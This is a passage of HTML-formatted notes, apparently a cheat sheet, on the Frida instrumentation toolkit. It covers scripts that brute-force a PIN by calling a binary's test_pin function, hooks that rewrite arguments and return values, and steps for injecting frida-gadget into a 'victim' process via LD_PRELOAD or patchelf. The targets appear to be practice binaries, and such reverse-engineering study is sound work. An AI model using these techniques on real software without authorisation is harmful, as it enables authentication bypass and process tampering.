&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativeFunction&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pointer&amp;#34;&lt;/span&gt;]);

&lt;span style=&#34;color:#a6e22e&#34;&gt;rpc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#75715e&#34;&gt;// defince accessible funcs from python
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;allocUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index.js&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    agent &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; frida&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;crypt&amp;#34;&lt;/span&gt;)
script &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_script(agent)
script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load()

api &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exports &lt;span style=&#34;color:#75715e&#34;&gt;# ref to funcs from js&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;):
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;test_pin(str(x))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;

    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Pin: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;x&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reuse-the-binary-code&#34;&gt;Reuse the binary code&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// get addr
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// create JS wrapper
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativeFunction&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pointer&amp;#34;&lt;/span&gt;]);


&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Trying: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;());
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;allocUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;());
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt;);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Pin is: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;());
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;function-hooking&#34;&gt;Function Hooking&lt;/h2&gt;
&lt;h3 id=&#34;by-symbol&#34;&gt;By symbol&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; __future__ &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; print_function
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; frida&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;)
script &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_script(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Interceptor.attach(ptr(&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;), {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    onEnter: function(args) {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        send(args[0].toInt32());
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;});
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on_message&lt;/span&gt;(message, data):
    print(message)
script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;on(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘&lt;/span&gt;message&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;’&lt;/span&gt;, on_message)
script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load()
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;by-symbol-1&#34;&gt;By symbol&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand_range&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rand_range&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#a6e22e&#34;&gt;Interceptor&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;attach&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand_range&lt;/span&gt;, {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;onEnter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// Replace with string
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;allocUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Frida sleep! :D\n&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#75715e&#34;&gt;// Replace with int
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativePointer&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0x1&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// or ptr(&amp;#34;0x1&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        
        &lt;span style=&#34;color:#75715e&#34;&gt;// Update the value
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;arg1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
    },
    &lt;span style=&#34;color:#a6e22e&#34;&gt;onLeave&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;retval&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;retval&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;retval&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;arg1&lt;/span&gt;);
    }
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;remote-execution-debugging&#34;&gt;Remote execution (debugging)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Proptip: Just add &lt;code&gt;-H&lt;/code&gt; or &lt;code&gt;-R&lt;/code&gt; if you want to use remote mode with default settings or you want to provide remote connection details&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#frida-server-remote&#34;&gt;frida-server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#frida-gadget-remote&#34;&gt;frida-gadget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
&lt;h3 id=&#34;frida-cli&#34;&gt;frida CLI&lt;/h3&gt;
&lt;p&gt;Open binary with &lt;code&gt;frida &amp;lt;exec&amp;gt;&lt;/code&gt; command and play with it in interactive shell session.&lt;/p&gt;
&lt;h3 id=&#34;frida-server-remote&#34;&gt;frida-server (remote)&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
frida-server -l 0.0.0.0:1337

&lt;span style=&#34;color:#75715e&#34;&gt;# on local client&lt;/span&gt;
frida-ps -H $IP:$PORT -R
frida -H $IP:$PORT $proc_name
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;frida-gadget-remote&#34;&gt;frida-gadget (remote)&lt;/h3&gt;
&lt;p&gt;Loaded apps are &lt;strong&gt;paused&lt;/strong&gt; (can be changed), common ways of injecting gadget:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;load with LD_PRELOAD&lt;/li&gt;
&lt;li&gt;load with patchelf&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
LD_PRELOAD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./frida-gadget.so ./crypt

&lt;span style=&#34;color:#75715e&#34;&gt;# on analysis machine&lt;/span&gt;
frida-ps -R &lt;span style=&#34;color:#75715e&#34;&gt;# should yield gadget process&lt;/span&gt;
frida -R Gadget
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
$ patchelf --add-needed ../frida-gadget.so crypt

&lt;span style=&#34;color:#75715e&#34;&gt;# on analysis machine&lt;/span&gt;
$ ./crypt
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Frida INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Listening on 127.0.0.1 TCP port &lt;span style=&#34;color:#ae81ff&#34;&gt;27042&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Configure with &lt;code&gt;frida-gadget.config&lt;/code&gt; (default):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;interaction&amp;#34;&lt;/span&gt;: {
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;listen&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;address&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;27042&lt;/span&gt;,
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;on_load&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;resume&amp;#34;&lt;/span&gt;
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scripting:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;interaction&amp;#34;&lt;/span&gt;: {
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;script&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/root/code/embedded-agent.js&amp;#34;&lt;/span&gt;
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativeFunction&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pointer&amp;#34;&lt;/span&gt;]);

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Trying: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;());
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;allocUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;());
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt;);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Pin is: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;());
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;frida-trace&#34;&gt;frida-trace&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Select function to trace&lt;/li&gt;
&lt;li&gt;Edit desired function behaviour
&lt;ol&gt;
&lt;li&gt;Open &lt;code&gt;__hooks__&lt;/code&gt; directory&lt;/li&gt;
&lt;li&gt;edit scripts there&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Run &amp;amp; watch new injected behaviour&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;onEnter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;state&lt;/span&gt;) {
